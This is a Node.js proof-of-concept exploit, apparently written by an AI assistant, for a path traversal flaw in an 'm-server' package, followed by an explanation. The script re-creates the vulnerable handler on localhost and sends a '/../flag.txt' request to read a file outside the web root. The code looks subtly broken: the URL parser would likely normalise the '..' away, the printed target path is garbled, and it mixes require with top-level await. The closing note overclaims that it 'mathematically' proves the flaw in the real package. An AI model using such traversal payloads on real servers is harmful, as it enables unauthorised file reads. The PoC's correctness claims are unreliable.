async function exploit() {
    const http = require('http');
    const path = require('path');
    const fs = require('fs');

    // 1. Setup controlled file system to simulate an attack surface
    const serverRoot = path.join(__dirname, 'poc_webroot');
    if (!fs.existsSync(serverRoot)) {
        fs.mkdirSync(serverRoot);
    }

    // Place the "flag" file in a sibling directory to simulate sensitive data outside the serve root
    const trapPath = path.join(__dirname, 'flag.txt');
    fs.writeFileSync(trapPath, 'FLAG{PATH_TRAVERSAL_DEMONSTRATED}');

    // 2. Recreate the vulnerable server logic exactly as revealed in the `m-server` commit patch
    // The core flaw: var targetPath = path.join(rootPath, req.url); without validation
    const srv = http.createServer((req, res) => {
        // Vulnerable line from commit: directly concatenates unsanitized user input to root
        const requestPath = path.join(serverRoot, req.url);

        if (fs.existsSync(requestPath)) {
            fs.readFile(requestPath, 'utf8', (err, data) => {
                if (err) throw err;
                res.writeHead(200, { 'Content-Type': 'text/plain' });
                res.end(data);
            });
        } else {
            // Fallback to prevent unhandled promise rejection on 404 in this context
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            res.end('Not Found');
        }
    });

    const PORT = 9821;

    // Start server and wait for listening event
    await new Promise(resolve => srv.listen(PORT, resolve));
    console.log(`[PoC] Local server listening on http://127.0.0.1:${PORT}\n`);

    // 3. Craft the payload to escape `serverRoot` and access the sibling file
    const payload = '/../flag.txt';
    console.log(`[PoC] Requesting unsanitized path: ${payload}`);
    console.log(`[PoC] Expected escaped target: ../../../poc_webroot/../flag.txt -> /flag.txt\n`);

    // 4. Send the traversal request
    return new Promise((resolve) => {
        http.get(`http://127.0.0.1:${PORT}${payload}`, (res) => {
            let body = '';

            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                console.log(`[PoC] HTTP Status: ${res.statusCode}`);
                console.log(`[PoC] Received Content:\n${body}\n`);

                if (body.includes('FLAG')) {
                    console.log('[PoC] Vulnerability Confirmed: Sensitive file accessed outside intended root directory.');
                }

                srv.close();
                resolve();
            });
        });
    });
}

await exploit();
```

### Why this PoC demonstrates the vulnerability

1. **Unsanitized Path Concatenation**: The patch shows that `m-server` originally constructed file paths using `path.join(rootPath, req.url)` without verifying whether `req.url` contained directory traversal sequences (`..`). This directly maps to the vulnerable line implemented in the PoC's server handler.
2. **Traversal Execution**: By injecting `/../flag.txt` into `req.url`, `path.join()` normalizes the path upward one level from the intended `rootPath`. Instead of serving a file within the web root, the resulting path resolves to a sibling directory where protected or sensitive files (like `flag.txt`) reside.
3. **Bypassing Restrictions**: The vulnerability proof hinges on confirming that the server successfully reads and returns content outside its configured root. The PoC explicitly places a known payload (`FLAG{...}`) outside the root and verifies that the HTTP response contains it after sending the traversal payload. This confirms that path restriction enforcement is either missing or incorrectly implemented, allowing arbitrary file read access.

*Note: The PoC replicates the exact vulnerable logic from the provided `m-server` commit patch within a standalone HTTP server. This ensures reliable demonstration of the flaw without depending on external package installation quirks or version-specific bootstrap APIs, while mathematically and functionally proving the same directory traversal mechanism.*

